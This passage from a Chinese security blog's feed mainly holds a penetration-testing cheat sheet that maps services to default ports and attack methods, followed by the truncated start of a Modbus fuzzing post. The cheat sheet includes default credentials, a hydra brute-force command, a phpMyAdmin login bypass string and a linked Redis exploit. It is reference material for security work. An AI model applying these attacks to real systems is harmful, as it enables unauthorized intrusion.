<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wooyun.jozxing.cc/static/drops/papers-2466.html" target="_blank" rel="external">CRLF Injection漏洞的利用与实例分析</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-58.html" target="_blank" rel="external">URL重定向/跳转漏洞</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>端口渗透总结</title>
    <link href="http://uknowsec.cn/posts/notes/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/端口渗透总结.html</id>
    <published>2017-08-21T09:35:53.000Z</published>
    <updated>2017-08-25T02:34:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
<h2 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h2><h3 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<h4 id="默认端口："><a href="#默认端口：" class="headerlink" title="默认端口："></a>默认端口：</h4><p>20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<h4 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</li>
<li>匿名访问：用户名：anonymous  密码：为空或任意邮箱</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户名：FTP            密码：FTP或为空</div><div class="line">用户名：USET         密码：pass</div><div class="line">当然还有不需要用户名密码直接访问的，一般出现在局域网中</div></pre></td></tr></table></figure>
<h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h3><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<h4 id="默认端口：2049"><a href="#默认端口：2049" class="headerlink" title="默认端口：2049"></a>默认端口：2049</h4><h4 id="攻击方式：-1"><a href="#攻击方式：-1" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问：未限制IP以及用户权限设置错误 </li>
</ul>
<h3 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h3><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<h4 id="默认端口：-1"><a href="#默认端口：-1" class="headerlink" title="默认端口："></a>默认端口：</h4><p>137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<h4 id="攻击方式：-2"><a href="#攻击方式：-2" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb</li>
<li>未授权访问：给予public用户高权限</li>
<li>远程代码执行漏洞：CVE-2015-0240等等</li>
</ul>
<h3 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h3><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<h4 id="默认端口：389"><a href="#默认端口：389" class="headerlink" title="默认端口：389"></a>默认端口：389</h4><h4 id="攻击方式：-3"><a href="#攻击方式：-3" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>注入攻击：盲注</li>
<li>未授权访问：</li>
<li>爆破：弱口令</li>
</ul>
<h2 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h2><h3 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h3><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<h4 id="默认端口：22"><a href="#默认端口：22" class="headerlink" title="默认端口：22"></a>默认端口：22</h4><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>爆破：弱口令、</li>
<li>漏洞：28退格漏洞、OpenSSL漏洞</li>
</ul>
<h3 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h3><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<h4 id="默认端口：23"><a href="#默认端口：23" class="headerlink" title="默认端口：23"></a>默认端口：23</h4><h4 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>爆破：弱口令</li>
<li>嗅探：此种情况一般发生在局域网；</li>
</ul>
<h3 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h3><p>远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<h4 id="默认端口：3389"><a href="#默认端口：3389" class="headerlink" title="默认端口：3389"></a>默认端口：3389</h4><h4 id="攻击方式：-4"><a href="#攻击方式：-4" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：3389端口爆破工具就有点多了</li>
<li>Shift粘滞键后门：5次shift后门</li>
<li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；请参考</li>
</ul>
<h3 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h3><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
<h4 id="默认端口：-2"><a href="#默认端口：-2" class="headerlink" title="默认端口："></a>默认端口：</h4><p>5900+桌面ID（5901；5902） </p>
<h4 id="攻击方式：-5"><a href="#攻击方式：-5" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>认证口令绕过：</li>
<li>拒绝服务攻击：（CVE-2015-5239）</li>
<li>权限提升：（CVE-2013-6886）</li>
</ul>
<h3 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h3><p>PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<h4 id="默认端口：5632"><a href="#默认端口：5632" class="headerlink" title="默认端口：5632"></a>默认端口：5632</h4><h3 id="攻击方式：-6"><a href="#攻击方式：-6" class="headerlink" title="攻击方式："></a>攻击方式：</h3><ul>
<li>提权控制服务：</li>
<li>拒绝服务攻击：</li>
<li>代码执行：请参考</li>
</ul>
<h2 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h2><p>HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h3 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h3><h4 id="默认端口：80-81-443"><a href="#默认端口：80-81-443" class="headerlink" title="默认端口：80/81/443"></a>默认端口：80/81/443</h4><h4 id="攻击方式：-7"><a href="#攻击方式：-7" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>IIS PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</li>
<li>短文件名泄漏：这种一般没啥影响</li>
<li>解析漏洞：详细见apache服务</li>
</ul>
<h3 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h3><h4 id="默认端口：80-8080"><a href="#默认端口：80-8080" class="headerlink" title="默认端口：80/8080"></a>默认端口：80/8080</h4><h4 id="攻击方式：-8"><a href="#攻击方式：-8" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破manager后台）</li>
<li>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</li>
<li>解析漏洞：请参考</li>
</ul>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><h4 id="默认端口：7001"><a href="#默认端口：7001" class="headerlink" title="默认端口：7001"></a>默认端口：7001</h4><p>攻击方式：</p>
<ul>
<li>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</li>
<li>Congsole后台部署webshell：</li>
<li>Java反序列化：</li>
<li>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</li>
<li>SSRF窥探内网：央视网SSRF可窥探内网</li>
</ul>
<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><h4 id="默认端口8080"><a href="#默认端口8080" class="headerlink" title="默认端口8080"></a>默认端口8080</h4><p>其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
<h4 id="攻击方式：-9"><a href="#攻击方式：-9" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（爆破jboss系统后台）</li>
<li>远程代码执行：由于配置不当造成</li>
<li>Java反序列化：</li>
</ul>
<h3 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h3><h4 id="默认端口：908"><a href="#默认端口：908" class="headerlink" title="默认端口：908*"></a>默认端口：908*</h4><p>第一个应用就是9080，第二个就是9081；控制台9090</p>
<h4 id="攻击方式：-10"><a href="#攻击方式：-10" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（控制台）</li>
<li>任意文件泄漏：（CVE-2014-0823）</li>
<li>Java反序列化</li>
</ul>
<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><h4 id="默认端口：-3"><a href="#默认端口：-3" class="headerlink" title="默认端口："></a>默认端口：</h4><p>http 8080；IIOP 3700；控制台4848</p>
<h4 id="攻击方式：-11"><a href="#攻击方式：-11" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（对于控制台）</li>
<li>任意文件读取：</li>
<li>认证绕过：</li>
</ul>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><h4 id="默认端口：-4"><a href="#默认端口：-4" class="headerlink" title="默认端口："></a>默认端口：</h4><p>8080、8089</p>
<h4 id="攻击方式：-12"><a href="#攻击方式：-12" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（默认管理员）</li>
<li>未授权访问：</li>
<li>反序列化：</li>
</ul>
<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><h4 id="默认端口：8080"><a href="#默认端口：8080" class="headerlink" title="默认端口：8080"></a>默认端口：8080</h4><h4 id="攻击方式：-13"><a href="#攻击方式：-13" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>目录遍历</li>
<li>远程文件读取</li>
</ul>
<h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><h4 id="默认端口：8080-1"><a href="#默认端口：8080-1" class="headerlink" title="默认端口：8080"></a>默认端口：8080</h4><h4 id="攻击方式：-14"><a href="#攻击方式：-14" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程共享缓冲区溢出</li>
</ul>
<h3 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<h4 id="默认端口：1352"><a href="#默认端口：1352" class="headerlink" title="默认端口：1352"></a>默认端口：1352</h4><h4 id="攻击方式：-15"><a href="#攻击方式：-15" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令（admin password）控制台</li>
<li>信息泄露</li>
<li>跨站脚本攻击</li>
</ul>
<h2 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><h4 id="默认端口：3306"><a href="#默认端口：3306" class="headerlink" title="默认端口：3306"></a>默认端口：3306</h4><h4 id="攻击方式：-16"><a href="#攻击方式：-16" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>身份认证漏洞：CVE-2012-2122 </li>
<li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li>
<li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意</li>
</ul>
<h3 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h3><h4 id="默认端口：-5"><a href="#默认端口：-5" class="headerlink" title="默认端口："></a>默认端口：</h4><p>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<h4 id="攻击方式：-17"><a href="#攻击方式：-17" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令/使用系统用户</li>
</ul>
<h3 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h3><h4 id="默认端口：-6"><a href="#默认端口：-6" class="headerlink" title="默认端口："></a>默认端口：</h4><p>1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<ul>
<li>爆破：弱口令</li>
<li>注入攻击；</li>
<li>漏洞攻击；</li>
</ul>
<h3 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<h4 id="默认端口：5432"><a href="#默认端口：5432" class="headerlink" title="默认端口：5432"></a>默认端口：5432</h4><h4 id="攻击方式：-18"><a href="#攻击方式：-18" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令：postgres postgres</li>
<li>缓冲区溢出：CVE-2014-2669</li>
</ul>
<h3 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考</p>
<h4 id="默认端口：27017"><a href="#默认端口：27017" class="headerlink" title="默认端口：27017"></a>默认端口：27017</h4><h4 id="攻击方式：-19"><a href="#攻击方式：-19" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问；github有攻击代码；请点击</li>
</ul>
<h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h3><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="external">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
<h4 id="默认端口：6379"><a href="#默认端口：6379" class="headerlink" title="默认端口：6379"></a>默认端口：6379</h4><h4 id="攻击方式：-20"><a href="#攻击方式：-20" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问+配合ssh key提权； </li>
</ul>
<h3 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h3><h4 id="默认端口：-7"><a href="#默认端口：-7" class="headerlink" title="默认端口："></a>默认端口：</h4><p>服务端口5000；监听端口4100；备份端口：4200</p>
<h4 id="攻击方式：-21"><a href="#攻击方式：-21" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>命令注入：</li>
</ul>
<h3 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h3><h4 id="默认端口：5000"><a href="#默认端口：5000" class="headerlink" title="默认端口：5000"></a>默认端口：5000</h4><h4 id="攻击方式：-22"><a href="#攻击方式：-22" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li>
</ul>
<h3 id="CouchDB数据库"><a href="#CouchDB数据库" class="headerlink" title="CouchDB数据库"></a>CouchDB数据库</h3><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。</p>
<h4 id="默认端口：5984"><a href="#默认端口：5984" class="headerlink" title="默认端口：5984"></a>默认端口：5984</h4><h4 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>未授权访问</li>
</ul>
<p><a href="http://wooyun.jozxing.cc/static/drops/papers-16030.html" target="_blank" rel="external">利用CouchDB未授权访问漏洞执行任意系统命令</a></p>
<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
<h2 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h2><h3 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<h4 id="默认端口：-8"><a href="#默认端口：-8" class="headerlink" title="默认端口："></a>默认端口：</h4><p>25（smtp）、465（smtps）</p>
<h4 id="攻击方式：-23"><a href="#攻击方式：-23" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问</li>
</ul>
<h3 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h3><h4 id="默认端口：-9"><a href="#默认端口：-9" class="headerlink" title="默认端口："></a>默认端口：</h4><p>109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<ul>
<li>爆破；弱口令</li>
<li>未授权访问；</li>
</ul>
<h3 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h3><h4 id="默认端口：-10"><a href="#默认端口：-10" class="headerlink" title="默认端口："></a>默认端口：</h4><p>143（imap）、993（imaps）</p>
<h4 id="攻击方式：-24"><a href="#攻击方式：-24" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>爆破：弱口令</li>
<li>配置不当</li>
</ul>
<h2 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h2><h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><h4 id="默认端口：53"><a href="#默认端口：53" class="headerlink" title="默认端口：53"></a>默认端口：53</h4><h4 id="攻击方式：-25"><a href="#攻击方式：-25" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>区域传输漏洞</li>
</ul>
<h3 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h3><h4 id="默认端口：-11"><a href="#默认端口：-11" class="headerlink" title="默认端口："></a>默认端口：</h4><p>67&amp;68、546（DHCP Failover做双机热备的）</p>
<h4 id="攻击方式：-26"><a href="#攻击方式：-26" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>DHCP劫持；</li>
</ul>
<h3 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h3><h4 id="默认端口：161"><a href="#默认端口：161" class="headerlink" title="默认端口：161"></a>默认端口：161</h4><h4 id="攻击方式-3"><a href="#攻击方式-3" class="headerlink" title="攻击方式:"></a>攻击方式:</h4><ul>
<li>爆破：弱口令</li>
</ul>
<h2 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h2><h3 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h3><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="external">请参考</a></p>
<h3 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h3><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<h4 id="默认端口：2181"><a href="#默认端口：2181" class="headerlink" title="默认端口：2181"></a>默认端口：2181</h4><h4 id="攻击方式：-27"><a href="#攻击方式：-27" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问；</li>
</ul>
<h3 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<h4 id="默认端口：8069"><a href="#默认端口：8069" class="headerlink" title="默认端口：8069"></a>默认端口：8069</h4><h4 id="攻击方式：-28"><a href="#攻击方式：-28" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程命令执行：</li>
</ul>
<h3 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h3><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<h3 id="默认端口：-12"><a href="#默认端口：-12" class="headerlink" title="默认端口："></a>默认端口：</h3><p>9200（）、9300（）</p>
<p>攻击方式：</p>
<ul>
<li>未授权访问；</li>
<li>远程命令执行；</li>
<li>文件遍历；</li>
<li>低版本webshell植入；</li>
</ul>
<h3 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h3><h4 id="默认端口：11211"><a href="#默认端口：11211" class="headerlink" title="默认端口：11211"></a>默认端口：11211</h4><h3 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
<h4 id="默认端口：-13"><a href="#默认端口：-13" class="headerlink" title="默认端口："></a>默认端口：</h4><p>512（remote process execution）；513（remote login a latelnet）；514（cmd）</p>
<h4 id="攻击方式：-29"><a href="#攻击方式：-29" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>使用rlogin直接登录对方系统；</li>
</ul>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
<h4 id="默认端口：1090（）、1099（）"><a href="#默认端口：1090（）、1099（）" class="headerlink" title="默认端口：1090（）、1099（）"></a>默认端口：1090（）、1099（）</h4><h4 id="攻击方式：-30"><a href="#攻击方式：-30" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>远程命令执行（java反序列化，调用rmi方式执行命令）</li>
</ul>
<h3 id="Rsync服务"><a href="#Rsync服务" class="headerlink" title="Rsync服务"></a>Rsync服务</h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
<h4 id="默认端口：873"><a href="#默认端口：873" class="headerlink" title="默认端口：873"></a>默认端口：873</h4><h4 id="攻击方式：-31"><a href="#攻击方式：-31" class="headerlink" title="攻击方式："></a>攻击方式：</h4><ul>
<li>未授权访问；</li>
<li>本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。详细请参考 和 参考二</li>
</ul>
<h3 id="Socket代理"><a href="#Socket代理" class="headerlink" title="Socket代理"></a>Socket代理</h3><h4 id="默认端口：1080"><a href="#默认端口：1080" class="headerlink" title="默认端口：1080"></a>默认端口：1080</h4><p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录，不也~~~~</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ports.png" alt=""></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>总结来源于网络</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Peach对Modbus功能码的模糊测试</title>
    <link href="http://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html"/>
    <id>http://uknowsec.cn/posts/notes/Peach对Modbus功能码的模糊测试.html</id>
    <published>2017-08-10T01:48:08.000Z</published>
    <updated>2017-08-10T07:00:42.275Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Modbus功能码"><a href="#Modbus功能码" class="headerlink" title="Modbus功能码"></a>Modbus功能码</h3><table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">中文名称</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">读取线圈状态</td>
<td style="text-align:center">取得一组逻辑线圈的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">读取输入状态</td>
<td style="text-align:center">取得一组开关输入的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">读取保持寄存器</td>
<td style="text-align:center">在一个或多个保持寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>04</td>
<td style="text-align:center">读取输入寄存器</td>
<td style="text-align:center">在一个或多个输入寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>05</td>
<td style="text-align:center">强置单线圈</td>
<td style="text-align:center">强置一个逻辑线圈的通断状态</td>
</tr>
<tr>
<td>06</td>
<td style="text-align:center">预置单寄存器</td>
<td style="text-align:center">把具体二进值装入一个保持寄存器</td>
</tr>
<tr>
<td>07</td>
<td style="text-align:center">读取异常状态</td>
<td style="text-align:center">取得8个内部线圈的通断状态，这8个线圈的地址由控制器决定，用户逻辑可以将这些线圈定义，以说明从机状态，短报文适宜于迅速读取状态</td>
</tr>
<tr>
<td>08</td>
<td style="text-align:center">回送诊断校验</td>
<td style="text-align:center">把诊断校验报文送从机，以对通信处理进行评鉴</td>
</tr>
<tr>
<td>09</td>
